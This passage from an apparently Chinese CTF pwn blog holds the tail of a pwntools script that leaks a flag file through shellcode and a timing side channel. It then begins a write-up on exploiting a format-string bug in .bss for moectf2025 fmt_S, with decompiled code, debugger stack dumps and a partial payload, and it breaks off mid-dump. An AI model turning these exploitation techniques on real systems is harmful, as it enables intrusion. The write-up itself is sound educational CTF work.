class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">i, c</span>):</span><br><span class="line">        <span class="keyword">global</span> io</span><br><span class="line">        io = start()</span><br><span class="line">        shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax, 0</span></span><br><span class="line"><span class="string">        movabs rax, 0x67616C66</span></span><br><span class="line"><span class="string">        push 0</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        push rsp</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rsi, rdi</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rdx, 0x100</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov al, [rsp+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp al, &#123;&#125;</span></span><br><span class="line"><span class="string">        jbe $</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;shellcode: \n&#x27;</span>)</span><br><span class="line">        io.send(shellcode)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        l = <span class="number">0x20</span></span><br><span class="line">        r = <span class="number">0x80</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">                m = (l + r) // <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> find(i, m):</span><br><span class="line">                        r = m - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        l = m + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> l == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        log.info(l)</span><br><span class="line">        flag += <span class="built_in">chr</span>(l)</span><br><span class="line">        log.success(<span class="string">&quot;right, flag now is --&gt; &quot;</span>+flag)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;final flag --&gt; &quot;</span>+flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> shellcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记非栈上格式化字符串漏洞利用</title>
      <link href="/2025/08/10/%E8%AE%B0%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2025/08/10/%E8%AE%B0%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>时值 moectf2025（比赛原因写完过了两个月才发布），虽然已经不是小登了，但还是做几题练练手，顺带总结一下非栈上<code>fmtstr</code><br>同时补充六届强网拟态线下赛的一道题目</p><h2 id="0x01-关于非栈上fmtstr利用"><a href="#0x01-关于非栈上fmtstr利用" class="headerlink" title="0x01 关于非栈上fmtstr利用"></a>0x01 关于非栈上fmtstr利用</h2><p>之前一直没有专门记录过非栈上<code>fmtstr</code>的利用，姑且提一嘴<br>当我们读入的地址不在栈上时候（位于<code>bss</code>段或者堆上），便不能直接写入地址，所以不好简单的直接进行任意地址写，这时候就需要另一些办法，比较广泛的有利用栈上的指针跳板实现部分地址写（诸葛连弩 or 四马分肥），或者将栈迁移到对应区域，又或者是栈上可能存在着指向<code>link_map</code>的指针，利用其来修改<code>l_addr</code>，劫持<code>fini_array</code><br>下面用 moectf2025 的 fmt_s 来记录一下指针跳板的利用</p><h2 id="0x02-moectf2025-fmt-S"><a href="#0x02-moectf2025-fmt-S" class="headerlink" title="0x02 moectf2025 | fmt_S"></a>0x02 moectf2025 | fmt_S</h2><p>先把源码放出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re walking down the road when a monster appear.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">3</span> &amp;&amp; !flag; ++i )</span><br><span class="line">    talk();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)atk &lt;= <span class="number">0x1BF52</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;ve been eaten by the monster.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    he();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是关键的<code>talk</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">talk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You start talking to him...&quot;</span>);</span><br><span class="line">  flag ^= <span class="number">1u</span>;</span><br><span class="line">  read(<span class="number">0</span>, fmt, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(fmt);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> my_read(&amp;atk, <span class="number">8uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显的fmtstr漏洞，但是注意这里读入的<code>fmt</code>是在<code>bss</code>段的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000004040A0 atk             dq ?                    ; DATA XREF: talk+7A↑o</span><br><span class="line">.bss:00000000004040A0                                         ; main:loc_4013BE↑r</span><br><span class="line">.bss:00000000004040A8                 public flag</span><br><span class="line">.bss:00000000004040A8 flag            dd ?                    ; DATA XREF: talk+1B↑r</span><br><span class="line">.bss:00000000004040A8                                         ; talk+24↑w ...</span><br><span class="line">.bss:00000000004040AC                 align 20h</span><br><span class="line">.bss:00000000004040C0                 public fmt</span><br><span class="line">.bss:00000000004040C0 ; char fmt[256]</span><br><span class="line">.bss:00000000004040C0 fmt             db 100h dup(?)          ; DATA XREF: talk+2F↑o</span><br><span class="line">.bss:00000000004040C0                                         ; talk+43↑o</span><br><span class="line">.bss:00000000004040C0 _bss            ends</span><br><span class="line">.bss:00000000004040C0</span><br></pre></td></tr></table></figure><p>结合一下<code>main</code>函数逻辑，会通过变量<code>i</code>（位于栈上）和变量<code>flag</code>来限制<code>fmt</code>的使用<br>然后我们看封装的<code>my_read</code>，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">my_read</span><span class="params">(_BYTE *a1, <span class="type">size_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  a1[read(<span class="number">0</span>, a1, a2)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个点就是当我们输入满八字节时候，它会多补一个<strong>0</strong>，实现对<code>flag</code>的置0，从而可以绕过<code>flag</code>的限制（原本<code>flag</code>是0，然后每次<code>talk</code>函数都会将其按位异或1，实现一个翻转的效果，而只有<code>flag</code>等于0时候才能进入<code>talk</code>函数）<br>至于<code>i</code>的计数限制，我们用一次<code>fmtstr</code>利用来修改其最高字节为<code>0xff</code>，将其变为一个大负数即可<br>这样两个限制绕过了，我们便可以进行任意次的<code>fmtstr</code>的利用<br>看一眼可能的后门函数，其实没用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">he</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> command[<span class="number">6</span>]; <span class="comment">// [rsp+2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  qmemcpy(command, <span class="string">&quot;a_flag&quot;</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The monster is defeated, and you obtain: flag?&quot;</span>);</span><br><span class="line">  system(command);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到正题，我们如何进行这个<code>bss</code>段上的fmtstr的利用呢？尽管<code>fmtstr</code>不在栈上，其使用<code>k$</code>来索引参数时，也是在栈上索引的，我们这里是64位，这样索引的前<strong>5</strong>个参数都是寄存器的值（从<code>rsi</code>开始，<code>rdi</code>存放<code>fmtstr</code>本身），从<code>6$</code>开始便会索引到栈区域<br>所以我们能利用的便是栈上的数据，我们可以利用栈上的多级指针，修改其指向我们想要指向的地址，从而再利用其来修改数据，调试看看<br>在进入<code>printf</code>函数后，我们查看栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 60</span><br><span class="line">00:0000│ rsp 0x7ffcaf1e86c8 —▸ 0x401337 (talk+87) ◂— lea rax, [rip + 0xd15]</span><br><span class="line">01:0008│-010 0x7ffcaf1e86d0 —▸ 0x7ffcaf1e8818 —▸ 0x7ffcaf1e906a ◂— &#x27;/home/r3t2/CTF/moectf2025/fmt_s/pwn_patched&#x27;</span><br><span class="line">02:0010│-008 0x7ffcaf1e86d8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">03:0018│ rbp 0x7ffcaf1e86e0 —▸ 0x7ffcaf1e8700 ◂— 1</span><br><span class="line">04:0020│+008 0x7ffcaf1e86e8 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1</span><br><span class="line">05:0028│+010 0x7ffcaf1e86f0 ◂— 0x1000</span><br><span class="line">06:0030│+018 0x7ffcaf1e86f8 ◂— 0x100401110</span><br><span class="line">07:0038│+020 0x7ffcaf1e8700 ◂— 1</span><br><span class="line">08:0040│+028 0x7ffcaf1e8708 —▸ 0x79b4da629d90 (__libc_start_call_main+128) ◂— mov edi, eax</span><br><span class="line">09:0048│+030 0x7ffcaf1e8710 ◂— 0</span><br><span class="line">0a:0050│+038 0x7ffcaf1e8718 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">0b:0058│+040 0x7ffcaf1e8720 ◂— 0x1af1e8800</span><br><span class="line">0c:0060│+048 0x7ffcaf1e8728 —▸ 0x7ffcaf1e8818 —▸ 0x7ffcaf1e906a ◂— &#x27;/home/r3t2/CTF/moectf2025/fmt_s/pwn_patched&#x27;</span><br><span class="line">0d:0068│+050 0x7ffcaf1e8730 ◂— 0</span><br><span class="line">0e:0070│+058 0x7ffcaf1e8738 ◂— 0xa80c940d072fe83d</span><br><span class="line">0f:0078│+060 0x7ffcaf1e8740 —▸ 0x7ffcaf1e8818 —▸ 0x7ffcaf1e906a ◂— &#x27;/home/r3t2/CTF/moectf2025/fmt_s/pwn_patched&#x27;</span><br><span class="line">10:0080│+068 0x7ffcaf1e8748 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">11:0088│+070 0x7ffcaf1e8750 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">12:0090│+078 0x7ffcaf1e8758 —▸ 0x79b4da8e6040 (_rtld_global) —▸ 0x79b4da8e72e0 ◂— 0</span><br><span class="line">13:0098│+080 0x7ffcaf1e8760 ◂— 0x57f5ca30090de83d</span><br><span class="line">14:00a0│+088 0x7ffcaf1e8768 ◂— 0x5b6520c83da5e83d</span><br><span class="line">15:00a8│+090 0x7ffcaf1e8770 ◂— 0x79b400000000</span><br><span class="line">16:00b0│+098 0x7ffcaf1e8778 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">1a:00d0│+0b8 0x7ffcaf1e8798 ◂— 0x10b499ce6a95af00</span><br><span class="line">1b:00d8│+0c0 0x7ffcaf1e87a0 ◂— 0</span><br><span class="line">1c:00e0│+0c8 0x7ffcaf1e87a8 —▸ 0x79b4da629e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]</span><br><span class="line">1d:00e8│+0d0 0x7ffcaf1e87b0 —▸ 0x7ffcaf1e8828 —▸ 0x7ffcaf1e9096 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">1e:00f0│+0d8 0x7ffcaf1e87b8 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">1f:00f8│+0e0 0x7ffcaf1e87c0 —▸ 0x79b4da8e72e0 ◂— 0</span><br><span class="line">20:0100│+0e8 0x7ffcaf1e87c8 ◂— 0</span><br><span class="line">21:0108│+0f0 0x7ffcaf1e87d0 ◂— 0</span><br><span class="line">22:0110│+0f8 0x7ffcaf1e87d8 —▸ 0x401110 (_start) ◂— endbr64</span><br><span class="line">23:0118│+100 0x7ffcaf1e87e0 —▸ 0x7ffcaf1e8810 ◂— 1</span><br><span class="line">24:0120│+108 0x7ffcaf1e87e8 ◂— 0</span><br><span class="line">25:0128│+110 0x7ffcaf1e87f0 ◂— 0</span><br><span class="line">26:0130│+118 0x7ffcaf1e87f8 —▸ 0x401135 (_start+37) ◂— hlt</span><br><span class="line">27:0138│+120 0x7ffcaf1e8800 —▸ 0x7ffcaf1e8808 ◂— 0x1c</span><br><span class="line">28:0140│+128 0x7ffcaf1e8808 ◂— 0x1c</span><br><span class="line">29:0148│+130 0x7ffcaf1e8810 ◂— 1</span><br><span class="line">2a:0150│ r12 0x7ffcaf1e8818 —▸ 0x7ffcaf1e906a ◂— &#x27;/home/r3t2/CTF/moectf2025/fmt_s/pwn_patched&#x27;</span><br><span class="line">2b:0158│+140 0x7ffcaf1e8820 ◂— 0</span><br><span class="line">2c:0160│+148 0x7ffcaf1e8828 —▸ 0x7ffcaf1e9096 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">2d:0168│+150 0x7ffcaf1e8830 —▸ 0x7ffcaf1e90a6 ◂— &#x27;no_proxy=172.31.*,172.30.*,172.29.*,172.28.*,172.27.*,172.26.*,172.25.*,172.24.*,172.23.*,172.22.*,172.21.*,172.20.*,172.19.*,172.18.*,172.17.*,172.16.*,10.*,192.168.*,127.*,localhost,&lt;local&gt;&#x27;</span><br><span class="line">2e:0170│+158 0x7ffcaf1e8838 —▸ 0x7ffcaf1e9166 ◂— &#x27;WSL2_GUI_APPS_ENABLED=1&#x27;</span><br><span class="line">2f:0178│+160 0x7ffcaf1e8840 —▸ 0x7ffcaf1e917e ◂— &#x27;WSL_DISTRO_NAME=Ubuntu-22.04&#x27;</span><br><span class="line">30:0180│+168 0x7ffcaf1e8848 —▸ 0x7ffcaf1e919b ◂— &#x27;WT_SESSION=0372699a-7fe9-401a-a75b-8b48d2e5f1c0&#x27;</span><br><span class="line">31:0188│+170 0x7ffcaf1e8850 —▸ 0x7ffcaf1e91cb ◂— &#x27;NAME=LAPTOP-6JKPOVPE&#x27;</span><br><span class="line">32:0190│+178 0x7ffcaf1e8858 —▸ 0x7ffcaf1e91e0 ◂— &#x27;PWD=/home/r3t2/CTF/moectf2025/fmt_s&#x27;</span><br><span class="line">33:0198│+180 0x7ffcaf1e8860 —▸ 0x7ffcaf1e9204 ◂— &#x27;LOGNAME=r3t2&#x27;</span><br><span class="line">34:01a0│+188 0x7ffcaf1e8868 —▸ 0x7ffcaf1e9211 ◂— &#x27;HOME=/home/r3t2&#x27;</span><br><span class="line">35:01a8│+190 0x7ffcaf1e8870 —▸ 0x7ffcaf1e9221 ◂— &#x27;LANG=C.UTF-8&#x27;</span><br><span class="line">36:01b0│+198 0x7ffcaf1e8878 —▸ 0x7ffcaf1e922e ◂— &#x27;WSL_INTEROP=/run/WSL/445_interop&#x27;</span><br><span class="line">37:01b8│+1a0 0x7ffcaf1e8880 —▸ 0x7ffcaf1e924f ◂— 0x524f4c4f435f534c (&#x27;LS_COLOR&#x27;)</span><br><span class="line">38:01c0│+1a8 0x7ffcaf1e8888 —▸ 0x7ffcaf1e983e ◂— &#x27;WAYLAND_DISPLAY=wayland-0&#x27;</span><br><span class="line">39:01c8│+1b0 0x7ffcaf1e8890 —▸ 0x7ffcaf1e9858 ◂— &#x27;https_proxy=http://127.0.0.1:7897&#x27;</span><br><span class="line">3a:01d0│+1b8 0x7ffcaf1e8898 —▸ 0x7ffcaf1e987a ◂— &#x27;LESSCLOSE=/usr/bin/lesspipe %s %s&#x27;</span><br><span class="line">3b:01d8│+1c0 0x7ffcaf1e88a0 —▸ 0x7ffcaf1e989c ◂— &#x27;TERM=xterm-256color&#x27;</span><br></pre></td></tr></table></figure><p>注意到这里存在一个多级指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0c:0060│+048 0x7ffcaf1e8728 —▸ 0x7ffcaf1e8818 —▸ 0x7ffcaf1e906a ◂— &#x27;/home/r3t2/CTF/moectf2025/fmt_s/pwn_patched&#x27;</span><br></pre></td></tr></table></figure><p>很容易发现，<code>0x7ffcaf1e906a</code>（记为<code>p2</code>）和栈上地址仅仅相差低两字节，如果我们能将其修改为返回地址的栈上地址，然后后续再找到<code>0x7ffcaf1e8818</code>（记为<code>p1</code>）的偏移处，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2a:0150│ r12 0x7ffcaf1e8818 —▸ 0x7ffcaf1e906a ◂— &#x27;/home/r3t2/CTF/moectf2025/fmt_s/pwn_patched&#x27;</span><br></pre></td></tr></table></figure><p>就能修改对应的地址处的数据<br>以修改<code>i</code>为例子，首先我们找到<code>i</code>在栈上的位置，因为<code>i</code>是一个<code>int</code>，这里位于高四字节处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">06:0030│+018 0x7ffcaf1e86f8 ◂— 0x100401110</span><br></pre></td></tr></table></figure><p>如果我们将<code>p2</code>的低两字节改为这里的<code>0x86f8+7</code>，那么<code>p2</code>便指向了<code>i</code>在栈上的最高字节，后续再通过<code>p1</code>写入<code>0xff</code>，便将其修改成了一个大负数，这里第一步的exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((i_addr &amp; <span class="number">0xffff</span>) + <span class="number">7</span>).encode() + <span class="string">b&quot;%17$hn&quot;</span> <span class="comment">#修改跳板指向i的栈上地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>关于这里地址的泄露，我们很容易能在栈上找到栈地址和libc地址，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">03:0018│ rbp 0x7ffcaf1e86e0 —▸ 0x7ffcaf1e8700 ◂— 1</span><br><span class="line">...</span><br><span class="line">1c:00e0│+0c8 0x7ffcaf1e87a8 —▸ 0x79b4da629e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]</span><br></pre></td></tr></table></figure><p>故地址泄露不再赘述<br>我们看修改结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 40</span><br><span class="line">00:0000│ rbp rsp 0x7ffcaf1e86e0 —▸ 0x7ffcaf1e8700 ◂— 1</span><br><span class="line">01:0008│+008     0x7ffcaf1e86e8 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1</span><br><span class="line">02:0010│+010     0x7ffcaf1e86f0 ◂— 0x1000</span><br><span class="line">03:0018│+018     0x7ffcaf1e86f8 ◂— 0x300401110</span><br><span class="line">04:0020│+020     0x7ffcaf1e8700 ◂— 1</span><br><span class="line">05:0028│+028     0x7ffcaf1e8708 —▸ 0x79b4da629d90 (__libc_start_call_main+128) ◂— mov edi, eax</span><br><span class="line">06:0030│+030     0x7ffcaf1e8710 ◂— 0</span><br><span class="line">07:0038│+038     0x7ffcaf1e8718 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">08:0040│+040     0x7ffcaf1e8720 ◂— 0x1af1e8800</span><br><span class="line">09:0048│+048     0x7ffcaf1e8728 —▸ 0x7ffcaf1e8818 —▸ 0x7ffcaf1e86ff ◂— 0x100</span><br><span class="line">0a:0050│+050     0x7ffcaf1e8730 ◂— 0</span><br><span class="line">0b:0058│+058     0x7ffcaf1e8738 ◂— 0xa80c940d072fe83d</span><br><span class="line">0c:0060│+060     0x7ffcaf1e8740 —▸ 0x7ffcaf1e8818 —▸ 0x7ffcaf1e86ff ◂— 0x100</span><br><span class="line">0d:0068│+068     0x7ffcaf1e8748 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">0e:0070│+070     0x7ffcaf1e8750 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">0f:0078│+078     0x7ffcaf1e8758 —▸ 0x79b4da8e6040 (_rtld_global) —▸ 0x79b4da8e72e0 ◂— 0</span><br><span class="line">10:0080│+080     0x7ffcaf1e8760 ◂— 0x57f5ca30090de83d</span><br><span class="line">11:0088│+088     0x7ffcaf1e8768 ◂— 0x5b6520c83da5e83d</span><br><span class="line">12:0090│+090     0x7ffcaf1e8770 ◂— 0x79b400000000</span><br><span class="line">13:0098│+098     0x7ffcaf1e8778 ◂— 0</span><br><span class="line">... ↓            3 skipped</span><br><span class="line">17:00b8│+0b8     0x7ffcaf1e8798 ◂— 0x10b499ce6a95af00</span><br><span class="line">18:00c0│+0c0     0x7ffcaf1e87a0 ◂— 0</span><br><span class="line">19:00c8│+0c8     0x7ffcaf1e87a8 —▸ 0x79b4da629e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]</span><br><span class="line">1a:00d0│+0d0     0x7ffcaf1e87b0 —▸ 0x7ffcaf1e8828 —▸ 0x7ffcaf1e9096 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">1b:00d8│+0d8     0x7ffcaf1e87b8 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">1c:00e0│+0e0     0x7ffcaf1e87c0 —▸ 0x79b4da8e72e0 ◂— 0</span><br><span class="line">1d:00e8│+0e8     0x7ffcaf1e87c8 ◂— 0</span><br><span class="line">1e:00f0│+0f0     0x7ffcaf1e87d0 ◂— 0</span><br><span class="line">1f:00f8│+0f8     0x7ffcaf1e87d8 —▸ 0x401110 (_start) ◂— endbr64</span><br><span class="line">20:0100│+100     0x7ffcaf1e87e0 —▸ 0x7ffcaf1e8810 ◂— 1</span><br><span class="line">21:0108│+108     0x7ffcaf1e87e8 ◂— 0</span><br><span class="line">22:0110│+110     0x7ffcaf1e87f0 ◂— 0</span><br><span class="line">23:0118│+118     0x7ffcaf1e87f8 —▸ 0x401135 (_start+37) ◂— hlt</span><br><span class="line">24:0120│+120     0x7ffcaf1e8800 —▸ 0x7ffcaf1e8808 ◂— 0x1c</span><br><span class="line">25:0128│+128     0x7ffcaf1e8808 ◂— 